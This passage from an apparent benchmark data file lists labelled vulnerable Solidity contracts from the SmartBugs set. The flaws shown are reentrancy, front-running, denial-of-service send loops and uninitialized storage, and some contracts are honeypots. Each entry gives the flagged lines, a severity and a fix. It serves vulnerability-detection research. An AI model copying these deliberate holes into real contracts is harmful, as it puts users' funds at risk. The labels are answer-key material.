    "file_content": "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/#dos-with-unexpected-revert\n * @author: ConsenSys Diligence\n* @vulnerable_at_lines: 24\n * Modified by Bernhard Mueller\n */\n\npragma solidity 0.4.24;\n\ncontract Refunder {\n    \naddress[] private refundAddresses;\nmapping (address => uint) public refunds;\n\n    constructor() {\n        refundAddresses.push(0x79B483371E87d664cd39491b5F06250165e4b184);\n        refundAddresses.push(0x79B483371E87d664cd39491b5F06250165e4b185);\n    }\n\n    // bad\n    function refundAll() public {\n        for(uint x; x < refundAddresses.length; x++) { // arbitrary length iteration based on how many addresses participated\n        // <yes> <report> DENIAL_OF_SERVICE\n            require(refundAddresses[x].send(refunds[refundAddresses[x]])); // doubly bad, now a single failure on send will hold up all funds\n        }\n    }\n\n}\n",
    "vulnerable_function": "refundAll",
    "vulnerable_lines": [
      24
    ],
    "vulnerability_type": "dos",
    "original_category": "denial_of_service",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Denial of service vulnerability - resource exhaustion or revert conditions at line(s) 24",
    "fix_description": "Avoid unbounded loops, implement pull payment pattern, add gas limits",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/denial_of_service/send_loop.sol",
    "pragma": "0.4.24",
    "source_url": "https://consensys.github.io/smart-contract-best-practices/known_attacks/#dos-with-unexpected-revert"
  },
  {
    "id": "smartbugs_front_running_ERC20",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "ERC20.sol",
    "file_content": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/transaction_order_dependence/ERC20.sol\n * @author: -\n * @vulnerable_at_lines: 110,113\n */\n\npragma solidity ^0.4.24;\n\n/** Taken from the OpenZeppelin github\n * @title SafeMath\n * @dev Math operations with safety checks that revert on error\n */\nlibrary SafeMath {\n\n  /**\n  * @dev Multiplies two numbers, reverts on overflow.\n  */\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n    // benefit is lost if 'b' is also tested.\n    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\n    if (a == 0) {\n      return 0;\n    }\n\n    uint256 c = a * b;\n    require(c / a == b);\n\n    return c;\n  }\n\n  /**\n  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.\n  */\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b > 0); // Solidity only automatically asserts when dividing by 0\n    uint256 c = a / b;\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n    return c;\n  }\n\n  /**\n  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).\n  */\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b <= a);\n    uint256 c = a - b;\n\n    return c;\n  }\n\n  /**\n  * @dev Adds two numbers, reverts on overflow.\n  */\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n    uint256 c = a + b;\n    require(c >= a);\n\n    return c;\n  }\n\n  /**\n  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),\n  * reverts when dividing by zero.\n  */\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b != 0);\n    return a % b;\n  }\n}\n\n\ncontract ERC20 {\n\n  event Transfer( address indexed from, address indexed to, uint256 value );\n  event Approval( address indexed owner, address indexed spender, uint256 value);\n  using SafeMath for *;\n\n  mapping (address => uint256) private _balances;\n\n  mapping (address => mapping (address => uint256)) private _allowed;\n\n  uint256 private _totalSupply;\n\n  constructor(uint totalSupply){\n    _balances[msg.sender] = totalSupply;\n  }\n\n  function balanceOf(address owner) public view returns (uint256) {\n    return _balances[owner];\n  }\n\n\n  function allowance(address owner, address spender) public view returns (uint256)\n  {\n    return _allowed[owner][spender];\n  }\n\n  function transfer(address to, uint256 value) public returns (bool) {\n    require(value <= _balances[msg.sender]);\n    require(to != address(0));\n\n    _balances[msg.sender] = _balances[msg.sender].sub(value);\n    _balances[to] = _balances[to].add(value);\n    emit Transfer(msg.sender, to, value);\n    return true;\n  }\n  // <yes> <report> FRONT_RUNNING\n  function approve(address spender, uint256 value) public returns (bool) {\n    require(spender != address(0));\n     // <yes> <report> FRONT_RUNNING\n    _allowed[msg.sender][spender] = value;\n    emit Approval(msg.sender, spender, value);\n    return true;\n  }\n\n  function transferFrom(address from, address to, uint256 value) public returns (bool) {\n    require(value <= _balances[from]);\n    require(value <= _allowed[from][msg.sender]);\n    require(to != address(0));\n\n    _balances[from] = _balances[from].sub(value);\n    _balances[to] = _balances[to].add(value);\n    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);\n    emit Transfer(from, to, value);\n    return true;\n  }\n}",
    "vulnerable_function": "approve",
    "vulnerable_lines": [
      110
    ],
    "vulnerability_type": "front_running",
    "original_category": "front_running",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Front-running vulnerability - transaction ordering dependence at line(s) 110",
    "fix_description": "Use commit-reveal scheme or submarine sends",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/front_running/ERC20.sol",
    "pragma": "0.4.24",
    "source_url": "https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/transaction_order_dependence/ERC20.sol"
  },
  {
    "id": "smartbugs_front_running_FindThisHash",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "FindThisHash.sol",
    "file_content": "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\npragma solidity ^0.4.22;\n\ncontract FindThisHash {\n    bytes32 constant public hash = 0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a;\n\n    constructor() public payable {} // load with ether\n\n    function solve(string solution) public {\n        // If you can find the pre image of the hash, receive 1000 ether\n         // <yes> <report> FRONT_RUNNING\n        require(hash == sha3(solution));\n        msg.sender.transfer(1000 ether);\n    }\n}\n",
    "vulnerable_function": "solve",
    "vulnerable_lines": [
      17
    ],
    "vulnerability_type": "front_running",
    "original_category": "front_running",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Front-running vulnerability - transaction ordering dependence at line(s) 17",
    "fix_description": "Use commit-reveal scheme or submarine sends",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/front_running/FindThisHash.sol",
    "pragma": "0.4.22",
    "source_url": "https://github.com/sigp/solidity-security-blog"
  },
  {
    "id": "smartbugs_front_running_eth_tx_order_dependence_minimal",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "eth_tx_order_dependence_minimal.sol",
    "file_content": "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 23,31\n */\n\npragma solidity ^0.4.16;\n\ncontract EthTxOrderDependenceMinimal {\n    address public owner;\n    bool public claimed;\n    uint public reward;\n\n    function EthTxOrderDependenceMinimal() public {\n        owner = msg.sender;\n    }\n\n    function setReward() public payable {\n        require (!claimed);\n\n        require(msg.sender == owner);\n        // <yes> <report> FRONT_RUNNING\n        owner.transfer(reward);\n        reward = msg.value;\n    }\n\n    function claimReward(uint256 submission) {\n        require (!claimed);\n        require(submission < 10);\n        // <yes> <report> FRONT_RUNNING\n        msg.sender.transfer(reward);\n        claimed = true;\n    }\n}\n",
    "vulnerable_function": "setReward",
    "vulnerable_lines": [
      23
    ],
    "vulnerability_type": "front_running",
    "original_category": "front_running",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Front-running vulnerability - transaction ordering dependence at line(s) 23",
    "fix_description": "Use commit-reveal scheme or submarine sends",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/front_running/eth_tx_order_dependence_minimal.sol",
    "pragma": "0.4.16",
    "source_url": "https://github.com/ConsenSys/evm-analyzer-benchmark-suite"
  },
  {
    "id": "smartbugs_front_running_odds_and_evens",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "odds_and_evens.sol",
    "file_content": "/*\n * @source: http://blockchain.unica.it/projects/ethereum-survey/attacks.html#oddsandevens\n * @author: -\n * @vulnerable_at_lines: 25,28\n */\n\npragma solidity ^0.4.2;\n\ncontract OddsAndEvens{\n\n  struct Player {\n    address addr;\n    uint number;\n  }\n\n  Player[2] public players;         //public only for debug purpose\n\n  uint8 tot;\n  address owner;\n\n  function OddsAndEvens() {\n    owner = msg.sender;\n  }\n// <yes> <report> FRONT_RUNNING\n  function play(uint number) payable{\n    if (msg.value != 1 ether) throw;\n    // <yes> <report> FRONT_RUNNING\n    players[tot] = Player(msg.sender, number);\n    tot++;\n\n    if (tot==2) andTheWinnerIs();\n  }\n\n  function andTheWinnerIs() private {\n    bool res ;\n    uint n = players[0].number+players[1].number;\n    if (n%2==0) {\n      res = players[0].addr.send(1800 finney);\n    }\n    else {\n      res = players[1].addr.send(1800 finney);\n    }\n\n    delete players;\n    tot=0;\n  }\n\n  function getProfit() {\n    if(msg.sender!=owner) throw;\n    bool res = msg.sender.send(this.balance);\n  }\n\n}\n",
    "vulnerable_function": "play",
    "vulnerable_lines": [
      25
    ],
    "vulnerability_type": "front_running",
    "original_category": "front_running",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Front-running vulnerability - transaction ordering dependence at line(s) 25",
    "fix_description": "Use commit-reveal scheme or submarine sends",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/front_running/odds_and_evens.sol",
    "pragma": "0.4.2",
    "source_url": "http://blockchain.unica.it/projects/ethereum-survey/attacks.html#oddsandevens"
  },
  {
    "id": "smartbugs_other_crypto_roulette",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "crypto_roulette.sol",
    "file_content": "/*\n * @source: https://github.com/thec00n/smart-contract-honeypots/blob/master/CryptoRoulette.sol\n * @vulnerable_at_lines: 40,41,42\n */\npragma solidity ^0.4.19;\n\n// CryptoRoulette\n//\n// Guess the number secretly stored in the blockchain and win the whole contract balance!\n// A new number is randomly chosen after each try.\n// https://www.reddit.com/r/ethdev/comments/7wp363/how_does_this_honeypot_work_it_seems_like_a/\n// To play, call the play() method with the guessed number (1-20).  Bet price: 0.1 ether\n\ncontract CryptoRoulette {\n\n    uint256 private secretNumber;\n    uint256 public lastPlayed;\n    uint256 public betPrice = 0.1 ether;\n    address public ownerAddr;\n\n    struct Game {\n        address player;\n        uint256 number;\n    }\n    Game[] public gamesPlayed;\n\n    function CryptoRoulette() public {\n        ownerAddr = msg.sender;\n        shuffle();\n    }\n\n    function shuffle() internal {\n        // randomly set secretNumber with a value between 1 and 20\n        secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 20 + 1;\n    }\n\n    function play(uint256 number) payable public {\n        require(msg.value >= betPrice && number <= 10);\n        // <yes> <report> OTHER - uninitialized storage\n        Game game; //Uninitialized storage pointer\n        game.player = msg.sender;\n        game.number = number;\n        gamesPlayed.push(game);\n\n        if (number == secretNumber) {\n            // win!\n            msg.sender.transfer(this.balance);\n        }\n\n        shuffle();\n        lastPlayed = now;\n    }\n\n    function kill() public {\n        if (msg.sender == ownerAddr && now > lastPlayed + 1 days) {\n            suicide(msg.sender);\n        }\n    }\n\n    function() public payable { }\n}\n",
    "vulnerable_function": "play",
    "vulnerable_lines": [
      40,
      41,
      42
    ],
    "vulnerability_type": "logic_error",
    "original_category": "other",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Security vulnerability at line(s) 40, 41, 42",
    "fix_description": "Apply security best practices to fix this vulnerability",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/other/crypto_roulette.sol",
    "pragma": "0.4.19",
    "source_url": "https://github.com/thec00n/smart-contract-honeypots/blob/master/CryptoRoulette.sol"
  },
  {
    "id": "smartbugs_other_name_registrar",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "name_registrar.sol",
    "file_content": "/*\n * @source: https://github.com/sigp/solidity-security-blog#storage-example\n * @vulnerable_at_lines: 21\n */\n// A Locked Name Registrar\n\npragma solidity ^0.4.15;\ncontract NameRegistrar {\n\n    bool public unlocked = false;  // registrar locked, no name updates\n\n    struct NameRecord { // map hashes to addresses\n        bytes32 name;\n        address mappedAddress;\n    }\n\n    mapping(address => NameRecord) public registeredNameRecord; // records who registered names\n    mapping(bytes32 => address) public resolve; // resolves hashes to addresses\n\n    function register(bytes32 _name, address _mappedAddress) public {\n        // set up the new NameRecord\n        // <yes> <report> OTHER - uninitialized storage\n        NameRecord newRecord;\n        newRecord.name = _name;\n        newRecord.mappedAddress = _mappedAddress;\n\n        resolve[_name] = _mappedAddress;\n        registeredNameRecord[msg.sender] = newRecord;\n\n        require(unlocked); // only allow registrations if contract is unlocked\n    }\n}\n",
    "vulnerable_function": "register",
    "vulnerable_lines": [
      23
    ],
    "vulnerability_type": "logic_error",
    "original_category": "other",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Security vulnerability at line(s) 23",
    "fix_description": "Apply security best practices to fix this vulnerability",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/other/name_registrar.sol",
    "pragma": "0.4.15",
    "source_url": "https://github.com/sigp/solidity-security-blog#storage-example"
  },
  {
    "id": "smartbugs_other_open_address_lottery",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "open_address_lottery.sol",
    "file_content": "/*\n * @source: https://etherscan.io/address/0x741f1923974464efd0aa70e77800ba5d9ed18902#code\n * @vulnerable_at_lines: 91\n */\n\npragma solidity ^0.4.19;\n/*\n * This is a distributed lottery that chooses random addresses as lucky addresses. If these\n * participate, they get the jackpot: 7 times the price of their bet.\n * Of course one address can only win once. The owner regularly reseeds the secret\n * seed of the contract (based on which the lucky addresses are chosen), so if you did not win,\n * just wait for a reseed and try again!\n *\n * Jackpot chance:   1 in 8\n * Ticket price: Anything larger than (or equal to) 0.1 ETH\n * Jackpot size: 7 times the ticket price\n *\n * HOW TO PARTICIPATE: Just send any amount greater than (or equal to) 0.1 ETH to the contract's address\n * Keep in mind that your address can only win once\n *\n * If the contract doesn't have enough ETH to pay the jackpot, it sends the whole balance.\n\n https://www.reddit.com/r/ethdev/comments/7wp363/how_does_this_honeypot_work_it_seems_like_a/\n*/\n\ncontract OpenAddressLottery{\n    struct SeedComponents{\n        uint component1;\n        uint component2;\n        uint component3;\n        uint component4;\n    }\n    \n    address owner; //address of the owner\n    uint private secretSeed; //seed used to calculate number of an address\n    uint private lastReseed; //last reseed - used to automatically reseed the contract every 1000 blocks\n    uint LuckyNumber = 7; //if the number of an address equals 7, it wins\n        \n    mapping (address => bool) winner; //keeping track of addresses that have already won\n    \n    function OpenAddressLottery() {\n        owner = msg.sender;\n        reseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed\n    }\n    \n    function participate() payable {\n        if(msg.value<0.1 ether)\n            return; //verify ticket price\n        \n        // make sure he hasn't won already\n        require(winner[msg.sender] == false);\n        \n        if(luckyNumberOfAddress(msg.sender) == LuckyNumber){ //check if it equals 7\n            winner[msg.sender] = true; // every address can only win once\n            \n            uint win=msg.value*7; //win = 7 times the ticket price\n            \n            if(win>this.balance) //if the balance isnt sufficient...\n                win=this.balance; //...send everything we've got\n            msg.sender.transfer(win);\n        }\n        \n        if(block.number-lastReseed>1000) //reseed if needed\n            reseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed\n    }\n    \n    function luckyNumberOfAddress(address addr) constant returns(uint n){\n        // calculate the number of current address - 1 in 8 chance\n        n = uint(keccak256(uint(addr), secretSeed)[0]) % 8;\n    }\n    \n    function reseed(SeedComponents components) internal {\n        secretSeed = uint256(keccak256(\n            components.component1,\n            components.component2,\n            components.component3,\n            components.component4\n        )); //hash the incoming parameters and use the hash to (re)initialize the seed\n        lastReseed = block.number;\n    }\n    \n    function kill() {\n        require(msg.sender==owner);\n        \n        selfdestruct(msg.sender);\n    }\n    \n    function forceReseed() { //reseed initiated by the owner - for testing purposes\n        require(msg.sender==owner);\n        // <yes> <report> OTHER - uninitialized storage\n        SeedComponents s;\n        s.component1 = uint(msg.sender);\n        s.component2 = uint256(block.blockhash(block.number - 1));\n        s.component3 = block.difficulty*(uint)(block.coinbase);\n        s.component4 = tx.gasprice * 7;\n        \n        reseed(s); //reseed\n    }\n    \n    function () payable { //if someone sends money without any function call, just assume he wanted to participate\n        if(msg.value>=0.1 ether && msg.sender!=owner) //owner can't participate, he can only fund the jackpot\n            participate();\n    }\n\n}",
    "vulnerable_function": "forceReseed",
    "vulnerable_lines": [
      91
    ],
    "vulnerability_type": "logic_error",
    "original_category": "other",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Security vulnerability at line(s) 91",
    "fix_description": "Apply security best practices to fix this vulnerability",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/other/open_address_lottery.sol",
    "pragma": "0.4.19",
    "source_url": "https://etherscan.io/address/0x741f1923974464efd0aa70e77800ba5d9ed18902#code"
  },
  {
    "id": "smartbugs_reentrancy_0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54\n */\n\npragma solidity ^0.4.19;\n\ncontract PERSONAL_BANK\n{\n    mapping (address=>uint256) public balances;   \n   \n    uint public MinSum = 1 ether;\n    \n    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)revert();\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)revert();\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        balances[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Deposit();\n    }\n    \n}\n\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "Collect",
    "vulnerable_lines": [
      54
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 54",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 38\n */\n\npragma solidity ^0.4.19;\n\ncontract PrivateBank\n{\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    function PrivateBank(address _log)\n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value >= MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    {\n        if(_am<=balances[msg.sender])\n        {            \n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "CashOut",
    "vulnerable_lines": [
      38
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 38",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1.sol",
    "file_content": "\n/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 55\n */\n\npragma solidity ^0.4.19;\n\ncontract ACCURAL_DEPOSIT\n{\n    mapping (address=>uint256) public balances;   \n   \n    uint public MinSum = 1 ether;\n    \n    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)revert();\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)revert();\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        balances[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Deposit();\n    }\n    \n}\n\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "Collect",
    "vulnerable_lines": [
      55
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 55",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0x4e73b32ed6c35f570686b89848e5f39f20ecc106",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54\n */\n\npragma solidity ^0.4.19;\n\ncontract PRIVATE_ETH_CELL\n{\n    mapping (address=>uint256) public balances;   \n   \n    uint public MinSum;\n    \n    LogFile Log;\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        require(!intitalized);\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        require(!intitalized);\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        balances[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Deposit();\n    }\n    \n}\n\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "Collect",
    "vulnerable_lines": [
      54
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 54",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0x561eac93c92360949ab1f1403323e6db345cbf31",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x561eac93c92360949ab1f1403323e6db345cbf31.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54\n */\n\npragma solidity ^0.4.19;\n\ncontract BANK_SAFE\n{\n    mapping (address=>uint256) public balances;   \n   \n    uint public MinSum;\n    \n    LogFile Log;\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)throw;\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)throw;\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        balances[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Deposit();\n    }\n    \n}\n\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "Collect",
    "vulnerable_lines": [
      54
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 54",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0x561eac93c92360949ab1f1403323e6db345cbf31.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839.sol",
